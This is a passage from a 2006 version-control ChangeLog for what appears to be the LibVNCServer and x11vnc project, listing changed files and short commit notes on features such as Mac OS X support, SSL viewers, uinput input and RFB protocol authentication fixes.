	x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc_defs.c: x11vnc: FINDCREATEDISPLAY support to create X
	session if one cannot be found.  Fix bug in java viewer.

2006-11-24  runge <runge>

	* prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/remote.c, x11vnc/user.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: install ss_vncviewer 755,
	-prog option, HTTPONCE new socket for -inetd.

2006-11-23  runge <runge>

	* classes/ssl/Makefile.am, classes/ssl/README: rename to
	ss_vncviewer

2006-11-23  runge <runge>

	* classes/ssl/ss_vncviewer, classes/ssl/ssl_vncviewer: rename
	ssl_vncviewer to ss_vncviewer

2006-11-23  runge <runge>

	* classes/ssl/ss_vncviewer: rename ssl_vncviewer to ss_vncviewer

2006-11-22  runge <runge>

	* configure.ac: use AC_CHECK_LIB for fbpm and dpms

2006-11-21  runge <runge>

	* configure.ac: enable --without-fbpm and --without-dpms

2006-11-21  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/cursor.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/macosx.c, x11vnc/macosx.h,
	x11vnc/macosxCG.c, x11vnc/macosxCGS.c, x11vnc/macosxCGS.h,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pm.c, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/unixpw.c,
	x11vnc/userinput.c, x11vnc/win_utils.c, x11vnc/win_utils.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c, x11vnc/xdamage.c, x11vnc/xevents.c,
	x11vnc/xwrappers.c: x11vnc: Mac OS X fb fixes and cuttext, -nodpms
	option, local user wireframing

2006-11-21  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/filelist.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/zips/README: update to
	1.0.8 and renaming

2006-11-21  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_vnc_gui,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_vncviewer: 
	delete

2006-11-21  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssvnc_cmd,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ss_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssvnc.tcl: rename

2006-11-13  runge <runge>

	* ChangeLog, configure.ac, prepare_x11vnc_dist.sh, x11vnc/8to24.c,
	x11vnc/ChangeLog, x11vnc/Makefile.am, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/cursor.c,
	x11vnc/cursor.h, x11vnc/gui.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/linuxfb.c, x11vnc/macosx.c, x11vnc/macosx.h,
	x11vnc/macosxCG.c, x11vnc/macosxCG.h, x11vnc/macosxCGP.c,
	x11vnc/macosxCGP.h, x11vnc/macosxCGS.c, x11vnc/macosxCGS.h,
	x11vnc/options.c, x11vnc/options.h, x11vnc/params.h,
	x11vnc/pointer.c, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/selection.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/userinput.c, x11vnc/win_utils.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xdamage.c, x11vnc/xdamage.h, x11vnc/xevents.c,
	x11vnc/xinerama.c, x11vnc/xrandr.c, x11vnc/xrecord.c,
	x11vnc/xwrappers.c, x11vnc/xwrappers.h: x11vnc: Native Mac OS X
	support.

2006-11-08  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/.cp
	over,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.Power.Macintosh/vnc
	viewer.sh,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/Darwin.i386/.cpover,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_vnc_gui,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: Add Darwin
	stuff.  Sync to current 1.0.7

2006-11-08  runge <runge>

	* ChangeLog, classes/ssl/ssl_vncviewer, configure.ac,
	prepare_x11vnc_dist.sh, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: configure.ac -R and macosx,
	prepare_x11vnc_dist.sh rpm fix

2006-10-30  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: Add tip about how to
	reenable RECORD extension.

2006-10-12  dscho <dscho>

	* VisualNaCro/nacro.c, VisualNaCro/nacro.h: VisualNaCro: add
	sendascii

2006-10-12  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: x11vnc: -cursor_drag for DnD, etc.

2006-10-11  runge <runge>

	* libvncserver/tightvnc-filetransfer/rfbtightserver.c: N_ENC_CAPS
	check does not work if libz is not present.

2006-10-10  dscho <dscho>

	* VisualNaCro/ChangeLog, VisualNaCro/recorder.pl: VisualNaCro: add
	'i', 'c' and 'r' menu keys

2006-10-10  dscho <dscho>

	* VisualNaCro/ChangeLog, VisualNaCro/recorder.pl: VisualNaCro: add
	--compact and --compact-dragging

2006-10-07  runge <runge>

	* classes/ssl/ssl_vncviewer, x11vnc/README,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/connect_br.tcl,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/stunnel/loca
	tion.url,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/zips/README,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: Changes for ETV, double
	SSL/SSH.

2006-09-24  runge <runge>

	* classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/help.c, x11vnc/keyboard.c, x11vnc/pointer.c,
	x11vnc/sslhelper.c, x11vnc/unixpw.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: improve SSL Java
	viewer, cleanup -unixpw code.

2006-09-21  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_vncviewer: sync
	etv. profile cleanup

2006-09-21  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/connections.h, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/sslhelper.c, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/user.h, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc:
	-unixpw_cmd, -passwfile cmd:/custom:, -sslnofail, -ultrafilexfer

2006-09-18  runge <runge>

	* x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l: ETV release 1.0.4

2006-09-18  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle: sync
	ETV 1.0.4

2006-09-18  runge <runge>

	* libvncserver/rfbserver.c, x11vnc/README, x11vnc/x11vnc.c: x11vnc:
	improve ultravnc filexfer rate by calling rfbCheckFD more often

2006-09-17  runge <runge>

	*
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l: Sync ETV.

2006-09-17  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/connections.c,
	x11vnc/cursor.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pm.c, x11vnc/scan.c,
	x11vnc/screen.c, x11vnc/sslcmds.c, x11vnc/sslhelper.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xinerama.c, x11vnc/xwrappers.c: x11vnc: -verbose,
	-connect_or_exit, -rfbport 0, print out SSL cert.

2006-09-15  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c: 
	small tweaks, -sig alias.

2006-09-15  runge <runge>

	* libvncserver/rfbserver.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/help.c, x11vnc/screen.c, x11vnc/unixpw.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: x11vnc: clear DISPLAY for
	-unixpw su_verify, user supplied sig ignore.

2006-09-14  runge <runge>

	* classes/ssl/ssl_vncviewer, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/help.c, x11vnc/misc/enhanced_tightvnc_viewer/COPYING,
	x11vnc/misc/enhanced_tightvnc_viewer/README,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/README.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/esound/downl
	oad.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/openssl/down
	load.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/openssl/loca
	tion.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/plink/downlo
	ad.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/plink/licenc
	e.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/stunnel/down
	load.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/stunnel/loca
	tion.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/vncviewer/do
	wnload.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/info/vncviewer/lo
	cation.url,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/stunnel-client.co
	nf,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/stunnel-server.co
	nf,
	x11vnc/misc/enhanced_tightvnc_viewer/Windows/util/w98/location.url,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/ssl_vnc_gui,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/tightvncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_tightvncviewer.tc
	l, x11vnc/misc/enhanced_tightvnc_viewer/bin/util/ssl_vncviewer,
	x11vnc/misc/enhanced_tightvnc_viewer/bin/util/stunnel-server.conf,
	x11vnc/misc/enhanced_tightvnc_viewer/build.unix,
	x11vnc/misc/enhanced_tightvnc_viewer/filelist.txt,
	x11vnc/misc/enhanced_tightvnc_viewer/src/README,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/README,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_bundle,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_getpatches,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/_vncpatchapplied,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/stunnel-maxconn.pa
	tch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-fu
	llscreen.patch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/patches/tight-vncviewer-ne
	wfbsize.patch,
	x11vnc/misc/enhanced_tightvnc_viewer/src/zips/README,
	x11vnc/remote.c, x11vnc/util.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc:
	enhanced_tightvnc_viewer files, ssh -t keystroke response
	improvement.

2006-09-12  dscho <dscho>

	* VisualNaCro/Makefile.am, libvncserver-config.in: fix in-place
	compilation of VisualNaCro

2006-09-12  dscho <dscho>

	* VisualNaCro/recorder.pl: fix call to alert()

2006-09-12  dscho <dscho>

	* VisualNaCro/NEWS, VisualNaCro/nacro.c, VisualNaCro/nacro.h,
	VisualNaCro/recorder.pl: VisualNaCro: add magic key 'd' to display
	the current reference image

2006-09-12  dscho <dscho>

	* VisualNaCro/nacro.h: forgot to check in nacro.h

2006-09-12  dscho <dscho>

	* VisualNaCro/nacro.c, VisualNaCro/recorder.pl: implement rubberband
	for rectangular selection

2006-09-12  dscho <dscho>

	* VisualNaCro/Makefile.am, VisualNaCro/configure.ac: fix compilation
	with cygwin

2006-09-12  dscho <dscho>

	* rfb/rfbproto.h, vncterm/LinuxVNC.c, vncterm/VNConsole.c: do not
	always include rfb/keysym.h

2006-09-12  dscho <dscho>

	* AUTHORS, VisualNaCro/NEWS, VisualNaCro/nacro.c,
	VisualNaCro/nacro.h, VisualNaCro/recorder.pl: VisualNaCro: support
	clipboard and symbolic key names with X11::Keysyms

2006-09-12  dscho <dscho>

	* VisualNaCro/nacro.c, VisualNaCro/nacro.h: support clipboard

2006-09-11  dscho <dscho>

	* libvncclient/rfbproto.c, rfb/rfbclient.h: make cut text handling
	using a hook

2006-09-10  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cursor.c, x11vnc/help.c,
	x11vnc/ssltools.h, x11vnc/uinput.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: REQ_ARGS,
	EV_SYN/SYN_REPORT check. restore -cursor most under -display WAIT

2006-09-05  runge <runge>

	* classes/ssl/proxy.vnc, classes/ssl/ssl_vncviewer: Update
	ssl_vncviewer.  Fix bug in proxy.vnc with multiple PORT= params.

2006-08-10  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/linuxfb.c,
	x11vnc/uinput.c, x11vnc/uinput.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c: x11vnc: first pass at
	touchscreens via uinput.

2006-08-02  runge <runge>

	* x11vnc/ChangeLog: add to changelog

2006-08-02  runge <runge>

	* classes/ssl/ssl_vncviewer, x11vnc/README, x11vnc/help.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/remote.c,
	x11vnc/sslhelper.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc:
	tweaks to ssl_xfer; -ssltimeout option.

2006-07-31  runge <runge>

	* classes/ssl/ssl_vncviewer, x11vnc/README, x11vnc/pointer.c,
	x11vnc/scan.c, x11vnc/scan.h, x11vnc/x11vnc.1, x11vnc/x11vnc_defs.c: 
	x11vnc: more features to ssl_vncviewer for enhanced tightvnc viewer
	project

2006-07-29  runge <runge>

	* classes/ssl/ssl_vncviewer: one more tweak, start from disp 30

2006-07-29  runge <runge>

	* classes/ssl/ssl_vncviewer: add debug = 6 to stunnel config.

2006-07-28  runge <runge>

	* classes/ssl/ssl_vncviewer, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cursor.c, x11vnc/help.c, x11vnc/params.h, x11vnc/pointer.c,
	x11vnc/rates.c, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/solid.c, x11vnc/sslcmds.c,
	x11vnc/sslhelper.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/user.c, x11vnc/userinput.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: x11vnc: -rotate option

2006-07-18  runge <runge>

	* ChangeLog, configure.ac, x11vnc/8to24.c, x11vnc/ChangeLog,
	x11vnc/Makefile.am, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/cursor.c, x11vnc/gui.c,
	x11vnc/keyboard.c, x11vnc/linuxfb.c, x11vnc/nox11.h,
	x11vnc/nox11_funcs.h, x11vnc/pointer.c, x11vnc/remote.c,
	x11vnc/screen.c, x11vnc/selection.c, x11vnc/solid.c,
	x11vnc/sslhelper.c, x11vnc/uinput.c, x11vnc/userinput.c,
	x11vnc/util.c, x11vnc/v4l.c, x11vnc/win_utils.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c, x11vnc/xwrappers.c: x11vnc: enable --without-x
	builds for -rawfb only binaries.

2006-07-15  runge <runge>

	* configure.ac, prepare_x11vnc_dist.sh, x11vnc/README,
	x11vnc/help.c, x11vnc/user.c, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: update versions for next rel.  add some more
	shortcuts to user:opts

2006-07-12  runge <runge>

	* ChangeLog, configure.ac: LibVNCServer 0.8.2 release.

2006-07-12  runge <runge>

	* x11vnc/README, x11vnc/x11vnc.1, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: set REL8x

2006-07-12  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/linuxfb.c, x11vnc/params.h, x11vnc/pointer.c,
	x11vnc/screen.c, x11vnc/user.c, x11vnc/x11vnc.1: x11vnc: wording
	changes; remove "-rawfb cons" in favor of "console"

2006-07-11  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c,
	x11vnc/keyboard.c, x11vnc/remote.c, x11vnc/tkx11vnc,
	x11vnc/tkx11vnc.h, x11vnc/uinput.c, x11vnc/uinput.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: more
	UINPUT mode tweaks.

2006-07-10  runge <runge>

	* x11vnc/README, x11vnc/help.c, x11vnc/remote.c, x11vnc/sslcmds.c,
	x11vnc/sslhelper.c, x11vnc/uinput.c, x11vnc/unixpw.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: x11vnc: improve uinput heuristics so button
	clicks work on qt-embedded.

2006-07-09  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/Makefile.am,
	x11vnc/README, x11vnc/help.c, x11vnc/keyboard.c, x11vnc/linuxfb.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/params.h,
	x11vnc/pointer.c, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/tkx11vnc, x11vnc/tkx11vnc.h, x11vnc/uinput.c,
	x11vnc/uinput.h, x11vnc/util.c, x11vnc/v4l.c, x11vnc/x11vnc.1,
	x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c: x11vnc: add uinput support
	for full input into linux fb device (e.g. qt-embed).

2006-07-05  runge <runge>

	* x11vnc/README, x11vnc/keyboard.c: x11vnc: whoops str decl in wrong
	place for old compilers.

2006-07-04  runge <runge>

	* x11vnc/README, x11vnc/keyboard.c, x11vnc/pointer.c,
	x11vnc/xwrappers.c: x11vnc: check all XKeysymToString() return
	values.

2006-07-04  runge <runge>

	* x11vnc/README, x11vnc/keyboard.c, x11vnc/unixpw.c,
	x11vnc/unixpw.h: x11vnc: plug a couple unixpw gaps.

2006-07-04  runge <runge>

	* configure.ac, x11vnc/README, x11vnc/inet.c, x11vnc/keyboard.c,
	x11vnc/sslhelper.c, x11vnc/unixpw.c, x11vnc/user.c, x11vnc/util.c,
	x11vnc/v4l.c, x11vnc/x11vnc.c, x11vnc/x11vnc.h: x11vnc: remove
	compiler warnings; HP-UX tweaks.

2006-07-04  runge <runge>

	* ChangeLog, configure.ac, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/cursor.c,
	x11vnc/cursor.h, x11vnc/help.c, x11vnc/help.h, x11vnc/inet.c,
	x11vnc/pointer.c, x11vnc/remote.c, x11vnc/scan.c,
	x11vnc/sslhelper.c, x11vnc/sslhelper.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/userinput.c, x11vnc/util.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xevents.c: x11vnc: more -unixpw work.  add -license, etc.
	options

2006-06-24  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/connections.h, x11vnc/gui.c,
	x11vnc/scan.c, x11vnc/solid.c, x11vnc/sslcmds.c, x11vnc/unixpw.c,
	x11vnc/user.c, x11vnc/util.c, x11vnc/v4l.c, x11vnc/win_utils.c,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc_defs.c,
	x11vnc/xwrappers.c: x11vnc: misc cleanup.

2006-06-18  runge <runge>

	* x11vnc/8to24.c, x11vnc/ChangeLog, x11vnc/README,
	x11vnc/cleanup.c, x11vnc/connections.c, x11vnc/connections.h,
	x11vnc/cursor.c, x11vnc/gui.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/options.c, x11vnc/options.h, x11vnc/pm.c, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c, x11vnc/solid.c,
	x11vnc/sslcmds.c, x11vnc/sslhelper.c, x11vnc/sslhelper.h,
	x11vnc/ssltools.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/user.c,
	x11vnc/userinput.c, x11vnc/util.c, x11vnc/v4l.c,
	x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xdamage.c,
	x11vnc/xevents.c, x11vnc/xevents.h, x11vnc/xrandr.h,
	x11vnc/xwrappers.c: x11vnc: --grabkbd, -grabptr, -env, -allowedcmds,
	unixpw+WAIT user fred:options

2006-06-15  dscho <dscho>

	* VisualNaCro/README: fix typo

2006-06-15  dscho <dscho>

	* VisualNaCro/ChangeLog, VisualNaCro/NEWS, VisualNaCro/recorder.pl: 
	no need for Time::HiRes to play back

2006-06-15  dscho <dscho>

	* VisualNaCro/recorder.pl: add timing

2006-06-13  runge <runge>

	* classes/ssl/tightvnc-1.3dev7_javasrc-vncviewer-ssl.patch,
	x11vnc/ChangeLog, x11vnc/README, x11vnc/help.c, x11vnc/options.c,
	x11vnc/options.h, x11vnc/remote.c, x11vnc/screen.c,
	x11vnc/sslhelper.c, x11vnc/ssltools.h, x11vnc/unixpw.c,
	x11vnc/unixpw.h, x11vnc/user.c, x11vnc/util.c, x11vnc/util.h,
	x11vnc/x11vnc.1, x11vnc/x11vnc.c, x11vnc/x11vnc.h,
	x11vnc/x11vnc_defs.c: x11vnc: -display WAIT:cmd=FINDDISPLAY,
	HTTPONCE, -http_ssl option, Java fixes.

2006-06-09  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/unixpw.c, x11vnc/user.c: 
	x11vnc: make -display WAIT + -unixpw work on Solaris.

2006-06-08  runge <runge>

	* ChangeLog, prepare_x11vnc_dist.sh, x11vnc/ChangeLog,
	x11vnc/README, x11vnc/cleanup.c, x11vnc/connections.c,
	x11vnc/gui.c, x11vnc/help.c, x11vnc/options.c, x11vnc/pointer.c,
	x11vnc/remote.c, x11vnc/screen.c, x11vnc/solid.c, x11vnc/sslcmds.c,
	x11vnc/sslhelper.c, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/unixpw.h, x11vnc/user.c, x11vnc/user.h,
	x11vnc/v4l.c, x11vnc/win_utils.c, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xkb_bell.c, x11vnc/xrecord.c, x11vnc/xwrappers.c,
	x11vnc/xwrappers.h:   x11vnc: -display WAIT:..., -users unixpw=, su_verify dpy command.

2006-06-05  steven_carr <steven_carr>

	* libvncclient/rfbproto.c, libvncserver/auth.c,
	libvncserver/rfbserver.c: RFB 3.8 clients are well informed

2006-06-05  steven_carr <steven_carr>

	* libvncserver/auth.c: Better support for RFB >= 3.8 protocols

2006-06-05  steven_carr <steven_carr>

	* libvncserver/auth.c: All security types for RFB >= 3.7 *have* to
	respond with a Security Result (Even rfbSecTypeNone)

2006-06-03  runge <runge>

	* x11vnc/ChangeLog, x11vnc/README, x11vnc/cleanup.c,
	x11vnc/connections.c, x11vnc/help.c, x11vnc/keyboard.c,
	x11vnc/linuxfb.c, x11vnc/options.c, x11vnc/options.h,
	x11vnc/rates.c, x11vnc/remote.c, x11vnc/scan.c, x11vnc/screen.c,
	x11vnc/screen.h, x11vnc/sslcmds.c, x11vnc/sslhelper.c,
	x11vnc/sslhelper.h, x11vnc/tkx11vnc, x11vnc/tkx11vnc.h,
	x11vnc/unixpw.c, x11vnc/userinput.c, x11vnc/win_utils.c,
	x11vnc/win_utils.h, x11vnc/x11vnc.1, x11vnc/x11vnc.c,
	x11vnc/x11vnc.h, x11vnc/x11vnc_defs.c, x11vnc/xevents.c,
	x11vnc/xevents.h, x11vnc/xwrappers.c:  x11vnc: -capslock -skip_lockkeys; Alt keys under -rawfb cons.

2006-06-03  runge <runge>

	* libvncserver/auth.c: move all types into handler loop.

2006-05-29  steven_carr <steven_carr>

	* ChangeLog: Identified and removed some memory leaks associated
	with the Encodings RRE, CoRRE, ZLIB, and Ultra.  KeyboardLedState
	now has portable masks defined.  rfb >= 3.7 Security Type Handler
	list would grow 1 entry for each new client connection.

2006-05-29  steven_carr <steven_carr>

	* libvncserver/auth.c: Security Type memory leak plugged.  Leaks
	when rfb >= 3.7 clients connects.  The security list would grow 1
	entry when clients connect.

2006-05-28  steven_carr <steven_carr>

	* rfb/rfbproto.h: KeyboardLedState Encoding Masks are now defined
	for portability

2006-05-28  steven_carr <steven_carr>

	* libvncserver/corre.c, libvncserver/main.c,
	libvncserver/private.h, libvncserver/rfbserver.c,
	libvncserver/rre.c, libvncserver/ultra.c, libvncserver/zlib.c: 
	Plugged some memory leakage

2006-05-16  steven_carr <steven_carr>

	* libvncserver/rfbserver.c, rfb/rfb.h: Permit auth.c to test major
	version

2006-05-16  steven_carr <steven_carr>

	* libvncserver/auth.c: Specifically test for Major Version 3 added

2006-05-16  steven_carr <steven_carr>

	* ChangeLog, libvncserver/stats.c: Statistics now fit into 80-column
	output

2006-05-16  steven_carr <steven_carr>

	* libvncserver/stats.c: Statistics output now fits in 80-column
	output

2006-05-16  steven_carr <steven_carr>

	* libvncserver/cursor.c: Corrected Cursor Statistics reporting as
	messages

2006-05-15  dscho <dscho>

	* libvncserver/tightvnc-filetransfer/Makefile.am: remove unneeded
	file

2006-05-15  steven_carr <steven_carr>

	* libvncserver/rfbserver.c, rfb/rfb.h: Support sending TextChat
	messages back to the client

2006-05-15  steven_carr <steven_carr>

	* ChangeLog, libvncserver/cargs.c, libvncserver/main.c,
	libvncserver/rfbserver.c, rfb/rfb.h, rfb/rfbproto.h: Default to RFB
	3.8, add command line option to specify the RFB version.

2006-05-15  steven_carr <steven_carr>

	* ChangeLog, client_examples/SDLvncviewer.c,
	libvncclient/rfbproto.c, libvncclient/ultra.c, libvncclient/zrle.c,
	libvncserver/auth.c, libvncserver/corre.c, libvncserver/cursor.c,
	libvncserver/hextile.c, libvncserver/main.c,
	libvncserver/rfbserver.c, libvncserver/rre.c, libvncserver/scale.c,
